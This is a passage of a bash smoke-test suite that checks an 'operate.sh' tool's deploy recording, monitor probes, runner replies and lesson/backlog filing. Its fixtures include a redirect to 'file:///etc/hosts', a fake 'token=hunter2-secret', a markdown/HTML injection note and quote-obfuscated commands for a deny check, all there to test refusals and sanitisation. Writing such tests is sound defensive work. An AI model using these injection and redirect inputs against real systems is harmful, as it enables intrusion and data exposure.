# exit 128+15 and operate.sh exits 143 with no window change. Mutant "no INT/TERM/HUP trap around the deploy" leaves no row.
OD_N="$(od_cp 'len(o["deploys"])')"; OD_WS="$(od_cp 'o["window"]["start"]')"
odp "an interrupted deploy" 143 "$OD_GOOD" "APEX_DEPLOY_CMD=kill -TERM 0; sleep 5" -- plans/od-plan.md deploy
grep -q 'deploy INTERRUPTED (signal 15, exit 143) — recorded' "$OD_TMP/pty.out" || fail "operate-deploy: the interrupted deploy did not say it was recorded: $(cat "$OD_TMP/pty.out")"
[ "$(od_cp '(len(o["deploys"]), o["deploys"][-1]["exit"], o["window"]["start"])')" = "($((OD_N + 1)), 143, '$OD_WS')" ] || fail "operate-deploy: an interrupted deploy was not recorded with exit 143 (or it moved the window): $(od_cp 'o')"
# a deploy that cannot be recorded (here the deploy command moves checkpoint.json away) says so, exits 6 and never
# reports an open watch window. Mutant "warn and carry on" prints "watch window open" and exits 0.
odp "an unrecordable deploy" 6 "$OD_GOOD" "APEX_DEPLOY_CMD=mv '$OD_CP' '$OD_CP.away'" -- plans/od-plan.md deploy
mv "$OD_CP.away" "$OD_CP" || fail "operate-deploy: the unrecordable deploy fixture did not move the checkpoint"
grep -q 'the deploy ran (exit 0) but could not be recorded' "$OD_TMP/pty.out" && ! grep -q 'watch window open' "$OD_TMP/pty.out" || fail "operate-deploy: an unrecorded deploy did not fail clearly, or claimed an open window: $(cat "$OD_TMP/pty.out")"
ok "operate-deploy: operate.sh refuses an unlanded plan (3), an unset APEX_DEPLOY_CMD by name (2), HALT/APEX_HALT (4) and an invalid Monitor section (2); prints an Ask Contract and reads the ack only from the controlling terminal: detached (setsid) it refuses even with APEX_OPERATE_ACK set and says a human must type od@<sha> at their own terminal; an older landed sha, a short sha, a wrong slug or an empty ack are refused (threat 1); a failing deploy is recorded with ts/sha/exit/ack_source, exits 1 and opens no window or moves an open one (threat 2); the pty-typed ack deploys with PLAN_SLUG/LANDED_SHA and no APEX_OPERATE_ACK, opening the plan's 7-day window; status and --all status show day N of M, closed, the declared checks and the R5b warning; operate_deploy rows carry route_id null and ack_source tty and the ledger verifies; a deploy row records the checkout HEAD; an interrupted deploy is recorded with exit 143 and exits 143; an unrecordable deploy exits 6 and claims no window"

# 71. operate-loop (aidlc-borrowings Phase 3.4, ADR R5, R5b, R5c, R5d, R6, R8): operate.sh PLAN monitor|ingest and
#     --all monitor [--ingest] on a temp repo whose plans landed through the real init/land.sh and were deployed through
#     the pty ack of check 70. Plan ol declares http checks against a stub server on 127.0.0.1 (ThreadingHTTPServer on a
#     free port, killed by the EXIT trap), cmd checks and a runner check; plan ol2 reuses ol's check id c-high (the
#     adversarial neighbour of threat 1); plan nomon has no Monitor section; monitor.json holds one repo-level check.
#     Threats (failing-first, the mutant that turns each red is named in its fail message):
#     1) a signal credited to the wrong plan  2) a failed probe read as healthy or as 0
#     3) runner or note text written unescaped into LESSONS.md  4) an expired window still measured, or a live breach
#     expiring silently. Requirements 1-9 of the Phase 3.4 brief are asserted below, each named.
OL_TMP="$SMOKE_TMP/oploop"; rm -rf "${OL_TMP:?}"; mkdir -p "$OL_TMP" || fail "operate-loop: cannot create the temp dir"
OL="$OL_TMP/repo"; mkdir -p "$OL/plans" "$OL/.claude/apex-scope-loop" && git init -q -b main "$OL" || fail "operate-loop: cannot init the repo"
OL="$(cd "$OL" && pwd -P)"; OL_OPS="$EX/operate.sh"; OL_PTY="$OD_TMP/od-pty.py"; OL_DET="$OD_TMP/od-detach.py"
[ -f "$OL_PTY" ] && [ -f "$OL_DET" ] || fail "operate-loop: check 70's pty/detach helpers are missing"
cat >"$OL_TMP/stub.py" <<'PY'
# stub.py PORTFILE HITS — a threaded HTTP stub on 127.0.0.1 (free port written to PORTFILE); every request is logged.
import http.server, socketserver, sys
class H(http.server.BaseHTTPRequestHandler):
    def _any(self):
        with open(sys.argv[2], "a") as f:
            f.write("%s %s %s\n" % (self.command, self.path, "|".join(sorted(k.lower() for k in self.headers.keys()))))
        code = {"/ok": 200, "/err": 503, "/redir": 302}.get(self.path, 404)
        self.send_response(code)
        if code == 302:
            self.send_header("Location", "file:///etc/hosts")
        self.end_headers()
        self.wfile.write(b"stub")
    do_GET = do_POST = do_HEAD = _any
    def log_message(self, *a):
        pass
class S(socketserver.ThreadingMixIn, http.server.HTTPServer):
    daemon_threads = True
s = S(("127.0.0.1", 0), H)
with open(sys.argv[1] + ".tmp", "w") as f:
    f.write(str(s.server_address[1]))
import os; os.replace(sys.argv[1] + ".tmp", sys.argv[1])
s.serve_forever()
PY
: >"$OL_TMP/hits.log"
python3 -I "$OL_TMP/stub.py" "$OL_TMP/port" "$OL_TMP/hits.log" >/dev/null 2>&1 &
OL_PID=$!
# the stub dies with the smoke whatever happens (guarded: OL_PID may be unset or the process already gone)
if [ -n "${SMOKE_KEEP:-}" ]; then
  trap '{ [ -z "${OL_PID:-}" ] || kill "$OL_PID"; } >/dev/null 2>&1 || true' EXIT
else
  trap '{ [ -z "${OL_PID:-}" ] || kill "$OL_PID"; } >/dev/null 2>&1 || true; git -C "$SMOKE_TMP/repo" worktree prune >/dev/null 2>&1 || true; chmod -R u+w "$SMOKE_TMP" 2>/dev/null || true; rm -rf "$SMOKE_TMP"' EXIT
fi
for _ in $(seq 1 100); do [ -s "$OL_TMP/port" ] && break; sleep 0.1; done
OL_PORT="$(cat "$OL_TMP/port" 2>/dev/null || true)"; [[ "$OL_PORT" =~ ^[0-9]+$ ]] || fail "operate-loop: the stub HTTP server did not start"
OL_DEAD_PORT="$(python3 -c 'import socket; s = socket.socket(); s.bind(("127.0.0.1", 0)); print(s.getsockname()[1]); s.close()')"
cat >"$OL_TMP/runner.py" <<'PY'
# runner.py METRIC... — the APEX_MONITOR_CMD stub; its reply is chosen by runner.mode beside it.
import json, os, sys
here = os.path.dirname(os.path.abspath(__file__))
mode = open(os.path.join(here, "runner.mode")).read().strip()
with open(os.path.join(here, "runner-args.log"), "a") as f:
    f.write(" ".join(sys.argv[1:]) + "\n")
ms = sys.argv[1:]
if mode == "good":
    # F-005: stderr is never a note; the opt-in note is the reply's per-metric {"value", "note"} object
    sys.stderr.write("ok\n\ncontact ops@example.invalid token=hunter2-secret\n")
    print(json.dumps({m: {"value": 0.5, "note": "## L-999 `boom` <b>pwned</b> | [x](y)"} for m in ms}))
elif mode == "objx":
    print('{"r_err": {"value": 0.001, "zz": 1}}')
elif mode == "objnote":
    print('{"r_err": {"value": 0.001, "note": 5}}')
elif mode == "objnov":
    print('{"r_err": {"note": "x"}}')
elif mode == "bad":
    print("`## L-999` not json\n## L-998")
elif mode == "nan":
    print('{"r_err": NaN}')
elif mode == "extra":
    print(json.dumps({"r_err": 0.001, "zz": 1}))
elif mode == "missing":
    print("{}")
elif mode == "string":
    print('{"r_err": "0.001"}')
elif mode == "null":
    print('{"r_err": null}')
elif mode == "twice":
    print('{"r_err": 0.001, "r_err": 0.002}')
elif mode == "exit":
    print('{"r_err": 0.001}'); sys.exit(3)
PY
echo good >"$OL_TMP/runner.mode"
cat >"$OL_TMP/mkplan.py" <<'PY'
# mkplan.py OUT TITLE WINDOW_DAYS|- CHECKS_JSON — a plan with one done task and (unless CHECKS_JSON is "-") a Monitor section.
import json, sys
out, title, wd, checks = sys.argv[1:5]
body = "# %s\n\n- [x] **Phase 1.1** [docs] done\n  - Acceptance: true\n" % title
if checks != "-":
    cfg = {"checks": json.loads(checks)}
    if wd != "-":
        cfg["window_days"] = int(wd)
    body += "\n## Monitor\n\n```json\n" + json.dumps(cfg) + "\n```\n"
open(out, "w").write(body)
PY
# requirement 1's probe: the plan text verbatim as sh -c's only argument; it records $0, $#, PLAN_SLUG, a literal
# {slug}{metric} (a str.format interpolation would replace it), the cwd and the whole environment
OL_ARGCMD="printf '%s|%s|%s|%s\\n' \"\$0\" \"\$#\" \"\${PLAN_SLUG-unset}\" '{slug}{metric}' >'$OL_TMP/probe-args.txt'; pwd -P >>'$OL_TMP/probe-args.txt'; env >'$OL_TMP/probe-env.txt'; echo 7"
OL_CHECKS="$(python3 - "$OL_PORT" "$OL_DEAD_PORT" "$OL_ARGCMD" <<'PY'
import json, sys
port, dead, argcmd = sys.argv[1:4]
u = "http://127.0.0.1:%s" % port
print(json.dumps([
  {"id": "c-high", "metric": "m_high", "op": "<", "threshold": 5, "severity": "high", "probe": {"kind": "cmd", "command": argcmd}},
  {"id": "c-slow", "metric": "m_slow", "op": "<", "threshold": 5, "severity": "high", "probe": {"kind": "cmd", "command": "sleep 30; echo 1"}},
  {"id": "c-word", "metric": "m_word", "op": "<", "threshold": 5, "severity": "high", "probe": {"kind": "cmd", "command": "echo hello", "value": "stdout"}},
  {"id": "c-exit", "metric": "m_exit", "op": "==", "threshold": 3, "severity": "medium", "probe": {"kind": "cmd", "command": "echo 9; exit 3", "value": "exit"}},
  {"id": "c-pipe", "metric": "m_pipe", "op": "<", "threshold": 5, "severity": "high", "probe": {"kind": "cmd", "command": "false | cat"}},
  {"id": "c-grep", "metric": "m_grep", "op": "<", "threshold": 5, "severity": "high", "probe": {"kind": "cmd", "command": "grep -c x ./no-such.log"}},
  {"id": "h-status", "metric": "m_status", "op": "==", "threshold": 200, "severity": "low", "probe": {"kind": "http", "url": u + "/err", "measure": "status"}},
  {"id": "h-lat", "metric": "m_lat_err", "op": "<", "threshold": 5000, "severity": "high", "probe": {"kind": "http", "url": u + "/err", "measure": "latency_ms", "expect_status": 200}},
  {"id": "h-ok", "metric": "m_lat", "op": "<", "threshold": 5000, "severity": "high", "probe": {"kind": "http", "url": u + "/ok", "measure": "latency_ms", "expect_status": 200}},
  {"id": "h-redir", "metric": "m_redir", "op": "==", "threshold": 302, "severity": "high", "probe": {"kind": "http", "url": u + "/redir", "measure": "status"}},
  {"id": "h-dead", "metric": "m_dead", "op": "==", "threshold": 200, "severity": "high", "probe": {"kind": "http", "url": "http://127.0.0.1:%s/ok" % dead, "measure": "status"}},
  {"id": "r-run", "metric": "r_err", "op": "<", "threshold": 0.01, "severity": "high", "probe": {"kind": "runner"}}]))
PY
)" || fail "operate-loop: cannot build the fixture checks"
OL_FAST="$(python3 -c 'import json, sys; print(json.dumps([c for c in json.loads(sys.argv[1]) if c["id"] != "c-slow"]))' "$OL_CHECKS")"
# ol_land NAME TITLE WINDOW CHECKS — commit plans/NAME-plan.md and land it through init → worktree commit → land.sh.
ol_land() {
  python3 "$OL_TMP/mkplan.py" "$OL/plans/$1-plan.md" "$2" "$3" "$4" || fail "operate-loop: cannot write plan $1"
  git -C "$OL" add -A && git -C "$OL" commit -qm "plan $1" || fail "operate-loop: cannot commit plan $1"
  (cd "$OL" && APEX_GIBSON=0 "$EX/init.sh" "plans/$1-plan.md" >/dev/null 2>&1) || fail "operate-loop: init of $1 failed"
  local wt; wt="$(python3 -c 'import json,sys; print(json.load(open(sys.argv[1]))["worktree_path"])' "$(st "$OL" "plans/$1-plan.md")/checkpoint.json")"
  echo "$1" >"$wt/$1.txt"; git -C "$wt" add -A && git -C "$wt" commit -qm "work $1" || fail "operate-loop: cannot commit in the $1 worktree"
  OL_LAST_STATE="$(st "$OL" "plans/$1-plan.md")"
  (cd "$OL" && APEX_GIBSON=0 "$EX/land.sh" "plans/$1-plan.md" >"$OL_TMP/land-$1.log" 2>&1) || fail "operate-loop: land.sh of $1 failed: $(tail -3 "$OL_TMP/land-$1.log")"
  OL_LAST_SHA="$(git -C "$OL" rev-parse main)"
}
# ol_ship NAME SHA — the human step, on a pty with the right ack (check 70's helper), opening the plan's window
ol_ship() {
  (cd "$OL" && env APEX_DEPLOY_CMD="bash '$OD_TMP/deploy.sh' 0" python3 -I "$OL_PTY" "$1@$2" 60 "$OL_OPS" "plans/$1-plan.md" deploy >"$OL_TMP/pty.out" 2>&1) \
    || fail "operate-loop: the deploy of $1 failed: $(cat "$OL_TMP/pty.out")"
}
git -C "$OL" commit -q --allow-empty -m base
ol_land ol OL 7 "$OL_CHECKS"; OL_ST="$OL_LAST_STATE"; OL_SHA="$OL_LAST_SHA"
ol_land ol2 OL2 7 '[{"id": "c-high", "metric": "m2", "op": "<", "threshold": 5, "severity": "low", "probe": {"kind": "cmd", "command": "echo 9"}}]'; OL2_ST="$OL_LAST_STATE"; OL2_SHA="$OL_LAST_SHA"
ol_land nomon NOMON - -; OL_NM_ST="$OL_LAST_STATE"
printf '{"checks": [{"id": "r-disk", "metric": "disk_pct", "op": "<", "threshold": 50, "severity": "high", "probe": {"kind": "cmd", "command": "echo 99"}}]}\n' >"$OL/.claude/apex-scope-loop/monitor.json"
OL_BASE="$(dirname "$OL_ST")"; OL_RD="$OL_BASE/operate-repo"
mkdir -p "$OL_ST/dispatch" "$OL2_ST/dispatch" "$OL_RD/dispatch"
ol_ship ol "$OL_SHA"; ol_ship ol2 "$OL2_SHA"
OL_LES="$OL/.claude/apex-scope-loop/LESSONS.md"; OL_BL="$OL/.claude/apex-scope-loop/BACKLOG.md"
# olr LABEL WANT_RC [ENV...] -- ARGS... — operate.sh ARGS detached from $OL with the runner set and the deploy/ack
# variables present (they must never reach a probe); output in $OL_TMP/run.out.
olr() {
  local label="$1" want="$2" rc=0 k; shift 2
  k="$(od_split "$@")"
  (cd "$OL" && env -u APEX_LESSONS_FILE -u APEX_BACKLOG_FILE APEX_MONITOR_CMD="python3 -I '$OL_TMP/runner.py'" \
     APEX_OPERATE_ACK="ol@$OL_SHA" APEX_DEPLOY_CMD="bash '$OD_TMP/deploy.sh' 0" "${@:1:$k}" \
     python3 -I "$OL_DET" "$OL_TMP/run.out" 120 "$OL_OPS" "${@:$((k + 2))}") || rc=$?
  [ "$rc" = "$want" ] || fail "operate-loop: $label exited $rc, expected $want: $(cat "$OL_TMP/run.out")"
}
# olq FILE EXPR — a smoke-written Python expression over a JSON file (j) and its operate key (o); fixture data only.
olq() { python3 -c 'import json,sys; j=json.load(open(sys.argv[1])); print(eval(sys.argv[2], {"j": j, "o": (j.get("operate") or {}) if isinstance(j, dict) else {}}))' "$1" "$2"; }
# olrows DIR — the ledger rows under DIR/dispatch as (event, owner, check_id, value, breach_count, sink) tuples
olrows() { python3 -c 'import json,sys; print([(r["event"], r.get("slug", "repo" if r.get("repo") is True else None), r.get("check_id"), r.get("value"), r.get("breach_count"), r.get("sink")) for r in map(json.loads, open(sys.argv[1]))])' "$1/dispatch/ledger.jsonl"; }
OL_CP="$OL_ST/checkpoint.json"; OL2_CP="$OL2_ST/checkpoint.json"
# refusals: --all ingest and PLAN monitor --ingest are not forms; APEX_MONITOR_CMD unset with a runner check (R6)
olr "--all ingest" 2 -- --all ingest; grep -q 'status only' "$OL_TMP/run.out" || fail "operate-loop: --all ingest was not refused by name"
olr "PLAN monitor --ingest" 2 -- plans/ol-plan.md monitor --ingest; grep -q usage "$OL_TMP/run.out" || fail "operate-loop: PLAN monitor --ingest was not refused"
olr "APEX_MONITOR_CMD unset" 2 APEX_MONITOR_CMD= -- --all monitor --ingest
grep -q 'APEX_MONITOR_CMD is unset' "$OL_TMP/run.out" && [ "$(olq "$OL_CP" '"checks" in o')" = False ] || fail "operate-loop: an unset APEX_MONITOR_CMD was not refused before any probe (R6): $(cat "$OL_TMP/run.out")"
olr "APEX_MONITOR_CMD naming operate.sh" 2 "APEX_MONITOR_CMD=sh $OL_OPS" -- plans/ol-plan.md monitor
# the deny word is searched with quotes and backslashes removed (apex-dispatch pre-bash's normalisation)
for OL_MC in "sh de''ploy.sh" 'sh de\ploy.sh' 'sh de""ploy.sh'; do
  olr "APEX_MONITOR_CMD $OL_MC" 2 "APEX_MONITOR_CMD=$OL_MC" -- plans/ol-plan.md monitor
  grep -q 'APEX_MONITOR_CMD must not name operate.sh' "$OL_TMP/run.out" && [ "$(olq "$OL_CP" '"checks" in o')" = False ] \
    || fail "operate-loop: APEX_MONITOR_CMD '$OL_MC' was not refused before any probe (mutant: deny regex on the raw text): $(cat "$OL_TMP/run.out")"
done
# requirement 6: the per-run cap, in the real --all flow: four more landed plans (fabricated state) of 50 checks each,
# open windows → 209 checks → refused naming the cap before any probe. Mutant "cap only in monitorlib" turns this red.
python3 - "$OL_TMP" "$OL_BASE" <<'PY' || fail "operate-loop: cannot fabricate the cap plans"
import datetime, json, os, sys
tmp, base = sys.argv[1:3]
f = "%Y-%m-%dT%H:%M:%SZ"; t = datetime.datetime.utcnow()
checks = [{"id": "k%d" % i, "metric": "k", "op": "<", "threshold": 5, "severity": "low", "probe": {"kind": "cmd", "command": "echo 1"}} for i in range(50)]
for n in range(4):
    p = os.path.join(tmp, "cap%d-plan.md" % n)
    open(p, "w").write("# cap\n\n## Monitor\n\n```json\n" + json.dumps({"checks": checks}) + "\n```\n")
    d = os.path.join(base, "cafe0000000%d" % n); os.makedirs(d)
    json.dump({"landed": True, "plan_path": p, "operate": {"window": {"start": t.strftime(f), "end": (t + datetime.timedelta(days=3)).strftime(f), "days": 3}}}, open(os.path.join(d, "checkpoint.json"), "w"))
PY
olr "the probe cap" 2 -- --all monitor --ingest
grep -q 'the probe cap is 200 per run' "$OL_TMP/run.out" && [ "$(olq "$OL_CP" '"checks" in o')" = False ] && [ ! -s "$OL_TMP/runner-args.log" ] \
  || fail "operate-loop: 209 checks in one run were not refused before any probe (mutant: no per-run cap in the --all flow): $(cat "$OL_TMP/run.out")"
rm -rf "$OL_BASE"/cafe0000000? "$OL_TMP"/cap?-plan.md
# requirement 8: --all status and --all monitor walk the checkpoints in one python pass (a python3 shim counts -c starts)
mkdir -p "$OL_TMP/shim"; OL_PY3="$(command -v python3)"
printf '#!/bin/sh\n[ "$1" = -c ] && echo c >>"%s/py-starts.log"\nexec "%s" "$@"\n' "$OL_TMP" "$OL_PY3" >"$OL_TMP/shim/python3"; chmod +x "$OL_TMP/shim/python3"
: >"$OL_TMP/py-starts.log"; (cd "$OL" && PATH="$OL_TMP/shim:$PATH" "$OL_OPS" --all status >"$OL_TMP/status.out" 2>&1) || fail "operate-loop: --all status failed: $(cat "$OL_TMP/status.out")"
[ "$(wc -l <"$OL_TMP/py-starts.log" | tr -d ' ')" -le 1 ] || fail "operate-loop: --all status started python -c $(wc -l <"$OL_TMP/py-starts.log") times for 3 landed plans (requirement 8: one pass)"
grep -q 'WARNING: nomon is a landed feature plan with no ## Monitor section' "$OL_TMP/status.out" || fail "operate-loop: status does not warn about the landed feature plan with no Monitor section: $(cat "$OL_TMP/status.out")"

# --- run 1: --all monitor --ingest --------------------------------------------------------------------------------------
OL_T0="$(date +%s)"
olr "run 1" 0 -- --all monitor --ingest
OL_T1="$(date +%s)"; cp "$OL_TMP/run.out" "$OL_TMP/run1.out"
[ $((OL_T1 - OL_T0)) -lt 40 ] || fail "operate-loop: run 1 took $((OL_T1 - OL_T0)) s: the 10 s probe timeout did not kill the slow command's process group"
grep -q 'plan nomon: no ## Monitor section; skipped' "$OL_TMP/run1.out" && grep -q 'WARNING: nomon is a landed feature plan' "$OL_TMP/run1.out" \
  || fail "operate-loop: the plan with no Monitor section was not skipped with the R5b warning: $(cat "$OL_TMP/run1.out")"
# threat 2: the timed-out probe, a non-number line, the failed GET and the expect_status mismatch are unmeasured (null,
# never 0 and never a pass). Mutants "value 0 on timeout" / "unmeasured counts as ok" turn this red.
OL_UN="$(olq "$OL_CP" '[(i, o["checks"][i]["last_value"], o["checks"][i]["last_status"]) for i in ("c-slow", "c-word", "h-lat", "h-dead", "c-pipe", "c-grep")]')"
[ "$OL_UN" = "[('c-slow', None, 'unmeasured'), ('c-word', None, 'unmeasured'), ('h-lat', None, 'unmeasured'), ('h-dead', None, 'unmeasured'), ('c-pipe', None, 'unmeasured'), ('c-grep', None, 'unmeasured')]" ] \
  || fail "operate-loop: a failed probe was read as a value or a pass (threat 2): $OL_UN"
# F-017: in stdout mode (the default) an empty-stdout pipeline (false | cat exits 0) and grep -c on a missing log
# (exit 2) are unmeasured, never their exit code. Mutant "exit code when stdout is empty" turns this red (0 ok, 2 ok).
olq "$OL_CP" 'o["checks"]["c-pipe"]["last_reason"]' | grep -q 'printed nothing on stdout' && olq "$OL_CP" 'o["checks"]["c-grep"]["last_reason"]' | grep -q 'exited 2' \
  || fail "operate-loop: F-017: the stdout-mode reasons are wrong: $(olq "$OL_CP" '(o["checks"]["c-pipe"], o["checks"]["c-grep"])')"
olq "$OL_CP" 'o["checks"]["c-slow"]["last_reason"]' | grep -q 'timed out after 10 s' || fail "operate-loop: the timed-out probe has no timeout reason: $(olq "$OL_CP" 'o["checks"]["c-slow"]')"
olq "$OL_CP" 'o["checks"]["h-lat"]["last_reason"]' | grep -q 'status 503 is not the expected 200' || fail "operate-loop: requirement 4: latency_ms under an expect_status mismatch is not unmeasured with its reason"
# requirement 1 (cmd value rule): value exit → the exit code, stdout ignored (echo 9; exit 3 → 3, a pass of == 3);
# value stdout → the last number line
[ "$(olq "$OL_CP" '(o["checks"]["c-exit"]["last_value"], o["checks"]["c-exit"]["last_status"], o["checks"]["c-high"]["last_value"], o["checks"]["c-high"]["last_status"])')" = "(3, 'ok', 7, 'breach')" ] \
  || fail "operate-loop: the cmd value rule (exit: the exit code, stdout ignored; stdout: the last number line) is wrong: $(olq "$OL_CP" 'o["checks"]')"
# requirement 1: verbatim sh -c, no positional args, no slug/metric interpolation, cwd = the repo root, no APEX_* in env.
# Mutants "str.format the command" / "pass the slug as \$1" / "inherit the environment" turn this red.
[ "$(head -n 1 "$OL_TMP/probe-args.txt")" = "/bin/sh|0|unset|{slug}{metric}" ] && [ "$(sed -n 2p "$OL_TMP/probe-args.txt")" = "$OL" ] \
  || fail "operate-loop: requirement 1: the cmd probe did not run verbatim as sh -c's only argument in the repo root: $(cat "$OL_TMP/probe-args.txt")"
! grep -qE '^APEX_(OPERATE_ACK|DEPLOY_CMD|MONITOR_CMD)=' "$OL_TMP/probe-env.txt" && grep -q '^PATH=' "$OL_TMP/probe-env.txt" \
  || fail "operate-loop: requirement 1: a probe saw APEX_OPERATE_ACK / APEX_DEPLOY_CMD / APEX_MONITOR_CMD"
# requirement 4: http is GET only with no added headers or credentials, a 3xx is measured (never followed to file:)
[ "$(olq "$OL_CP" '(o["checks"]["h-redir"]["last_value"], o["checks"]["h-status"]["last_value"], o["checks"]["h-ok"]["last_status"], type(o["checks"]["h-ok"]["last_value"]).__name__)')" = "(302, 503, 'ok', 'float')" ] \
  || fail "operate-loop: requirement 4: http status/latency are wrong (302 measured, 503 measured, latency a number): $(olq "$OL_CP" 'o["checks"]')"
OL_HDR="$(awk '{print $1, $3}' "$OL_TMP/hits.log" | sort -u)"
[ "$OL_HDR" = "GET accept-encoding|connection|host" ] || fail "operate-loop: requirement 4: a probe sent a non-GET or an added header: $OL_HDR"
[ "$(awk '{print $2}' "$OL_TMP/hits.log" | sort -u | tr '\n' ' ')" = "/err /ok /redir " ] || fail "operate-loop: the probes hit unexpected paths: $(cat "$OL_TMP/hits.log")"
# requirement 3: the runner got the metric as its argv (no interpolation)
[ "$(cat "$OL_TMP/runner-args.log")" = "r_err" ] || fail "operate-loop: the runner was not called as APEX_MONITOR_CMD r_err: $(cat "$OL_TMP/runner-args.log")"
# ingest: the high breaches (c-high, r-run) are lessons tagged operate:{slug},{metric}; the low one (h-status) is a
# plan-level backlog item; ol2's breach of its own c-high (same id, low) is credited to ol2; the repo breach (high!)
# goes only to the backlog under operate:repo.
[ "$(grep -c '^## L-' "$OL_LES")" = 2 ] || fail "operate-loop: run 1 did not file exactly the two high breaches as lessons: $(cat "$OL_LES")"
grep -qF '**Tags:** #operate:ol #m_high' "$OL_LES" && grep -qF '**Tags:** #operate:ol #r_err' "$OL_LES" || fail "operate-loop: the lessons are not tagged operate:{slug},{metric}: $(cat "$OL_LES")"
# threat 3 / requirement 5: the runner's hostile stderr note reaches the lesson only sanitised: no ## L-999 heading,
# no backtick, no HTML, one line. Mutant "pass the runner note to lessons.sh unsanitised" turns this red.
grep -q 'runner note: L-999 _boom_' "$OL_LES" && ! grep -q '^## L-99' "$OL_LES" && ! grep -q '`' "$OL_LES" && ! grep -q '<b>' "$OL_LES" \
  || fail "operate-loop: threat 3: runner text reached LESSONS.md unescaped (or the reply's note is missing): $(cat "$OL_LES")"
# F-005: the runner's stderr (an email and a key=value) never becomes a note: no trace in LESSONS.md, BACKLOG.md, the
# checkpoint or a signal file. Mutant "the last stderr line is the note" turns this red.
! grep -rqE 'hunter2|example\.invalid' "$OL_LES" "$OL_BL" "$OL_CP" "$OL_ST/operate" \
  || fail "operate-loop: F-005: the runner's stderr reached a note: $(grep -rE 'hunter2|example\.invalid' "$OL_LES" "$OL_BL" "$OL_CP" "$OL_ST/operate")"
! grep -qE 'disk_pct|operate:repo' "$OL_LES" || fail "operate-loop: R5d: a repo-level breach was filed as a lesson"
python3 - "$OL_BL" <<'PY' || fail "operate-loop: the backlog sections are wrong (threat 1 / R5d): $(cat "$OL_BL")"
import re, sys
secs, cur = {}, None
for l in open(sys.argv[1]).read().split("\n"):
    if l.startswith("## "):
        cur = l; secs[cur] = []
    elif cur and l.startswith("- [ ] B-"):
        secs[cur].append(l)
want = {"## Plan: plans/ol-plan.md": ["[operate:ol] m_status 503"], "## Plan: plans/ol2-plan.md": ["[operate:ol2] m2 9"],
        "## Repo: operate checks (monitor.json)": ["[operate:repo] disk_pct 99"]}
assert set(secs) == set(want), secs
for k, ws in want.items():
    assert len(secs[k]) == len(ws) and all(w in i and "from operate" in i for w, i in zip(ws, secs[k])), (k, secs[k])
    assert all(("plan-level" if "Plan" in k else "repo-level") in i for i in secs[k]), (k, secs[k])
PY
# threat 1: every row carries its own plan's slug (ol2's c-high is ol2's, value 9; ol's is 7); repo rows carry repo: true
[ "$(olq "$OL2_CP" '(sorted(o["checks"]), o["checks"]["c-high"]["last_value"], o["checks"]["c-high"]["filed"])')" = "(['c-high'], 9, 'backlog')" ] \
  && [ "$(olq "$OL_CP" '(o["checks"]["c-high"]["last_value"], o["checks"]["c-high"]["filed"], o["checks"]["h-status"]["filed"], o["checks"]["r-run"]["filed"])')" = "(7, 'lessons', 'backlog', 'lessons')" ] \
  || fail "operate-loop: threat 1: a signal was credited to the wrong plan (mutant: a stale target in the --all loop): ol=$(olq "$OL_CP" 'o["checks"]["c-high"]') ol2=$(olq "$OL2_CP" 'o["checks"]')"
python3 - "$OL_ST" "$OL2_ST" "$OL_RD" <<'PY' || fail "operate-loop: threat 1: a signal row does not carry its own owner"
import glob, json, sys
for d, want in zip(sys.argv[1:4], ({"slug": "ol"}, {"slug": "ol2"}, {"repo": True})):
    fs = glob.glob(d + "/operate/signals-*.json"); assert fs, d
    for f in fs:
        for r in json.load(open(f)):
            assert {k: r[k] for k in ("slug", "repo") if k in r} == want, (f, r)
    for r in map(json.loads, open(d + "/dispatch/ledger.jsonl")):
        assert {k: r[k] for k in ("slug", "repo") if k in r} == want and r["route_id"] is None, (d, r)
PY
# requirement 9 / threat 2: unmeasured signals are null in the ledger (never 0); sinks as filed
OL_R1="$(olrows "$OL_ST")"
for want in "('operate_signal', 'ol', 'c-high', 7, 1, 'lessons')" "('operate_signal', 'ol', 'r-run', 0.5, 1, 'lessons')" "('operate_signal', 'ol', 'h-status', 503, 1, 'backlog')" \
            "('operate_signal', 'ol', 'c-slow', None, 0, 'counted')" "('operate_signal', 'ol', 'h-lat', None, 0, 'counted')"; do
  case "$OL_R1" in *"$want"*) ;; *) fail "operate-loop: the ol ledger lacks $want (requirement 9: null, never 0): $OL_R1" ;; esac
done
[ "$(olrows "$OL_RD")" = "[('operate_signal', 'repo', 'r-disk', 99, 1, 'backlog')]" ] || fail "operate-loop: the repo ledger row is wrong: $(olrows "$OL_RD")"
(cd "$OL" && "$OL_OPS" plans/ol-plan.md status >"$OL_TMP/status.out" 2>&1) || fail "operate-loop: status failed: $(cat "$OL_TMP/status.out")"
grep -q 'last: unmeasured (unmeasured: the command timed out after 10 s)' "$OL_TMP/status.out" && ! grep -qE 'c-slow.*last: 0' "$OL_TMP/status.out" \
  || fail "operate-loop: requirement 9: status does not show the timed-out check as unmeasured: $(cat "$OL_TMP/status.out")"

# --- run 2: the slow check removed (it cost 10 s), the runner reply malformed ------------------------------------------
python3 "$OL_TMP/mkplan.py" "$OL/plans/ol-plan.md" OL 7 "$OL_FAST"
echo bad >"$OL_TMP/runner.mode"
olr "run 2" 0 -- --all monitor --ingest; cp "$OL_TMP/run.out" "$OL_TMP/run2.out"
[ "$(grep -c '^## L-' "$OL_LES")" = 2 ] && [ "$(grep -c '^- \[ \] B-' "$OL_BL")" = 3 ] || fail "operate-loop: a repeat breach was re-filed instead of counted: $(cat "$OL_LES" "$OL_BL")"
[ "$(olq "$OL_CP" '(o["checks"]["c-high"]["breaches"], o["checks"]["c-high"]["filed"], o["checks"]["c-high"].get("counted"))')" = "(2, 'lessons', 1)" ] \
  || fail "operate-loop: the repeat of c-high was not counted: $(olq "$OL_CP" 'o["checks"]["c-high"]')"
case "$(olrows "$OL_ST")" in *"('operate_signal', 'ol', 'c-high', 7, 2, 'counted')"*) ;; *) fail "operate-loop: the repeat's ledger row is not sink counted, breach_count 2: $(olrows "$OL_ST")" ;; esac
# requirement 3 / threat 2: the malformed runner reply fails closed; requirement 5: its text is stored sanitised
[ "$(olq "$OL_CP" '(o["checks"]["r-run"]["last_value"], o["checks"]["r-run"]["last_status"])')" = "(None, 'unmeasured')" ] || fail "operate-loop: a malformed runner reply was not unmeasured: $(olq "$OL_CP" 'o["checks"]["r-run"]')"
OL_RS="$(olq "$OL_CP" 'o["checks"]["r-run"]["last_reason"]')"
case "$OL_RS" in *'not valid JSON'*) ;; *) fail "operate-loop: the malformed reply's reason is not recorded: $OL_RS" ;; esac
case "$OL_RS" in *'`'*|*'#'*) fail "operate-loop: requirement 5: the runner's reply text was stored unsanitised: $OL_RS" ;; esac
